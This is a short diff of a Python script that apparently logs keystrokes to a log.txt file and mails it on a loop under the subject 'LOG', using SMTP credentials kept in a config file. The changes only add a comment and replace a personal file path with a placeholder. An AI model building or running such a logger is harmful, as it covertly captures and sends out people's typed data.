@@ -9,7 +9,7 @@ import os.path
 from threading import Thread
 import time
 import config
-
+#create config.py for smtp credential
 
 def send_email():
     while True:
@@ -72,7 +72,8 @@ password = config.password
 send_to_email = config.receiver
 subject = 'LOG'
 message = '-----------'
-file_location = 'C:\\Users\\Elmar\\Desktop\\c3linux\\log.txt'
+file_location = 'C:\\Users\\yourname\\path\\log.txt'
+#file_location = 'C:\\Users\\Elmar\\Desktop\\c3linux\\log.txt'
 word = ""
 
 msg = MIMEMultipart()
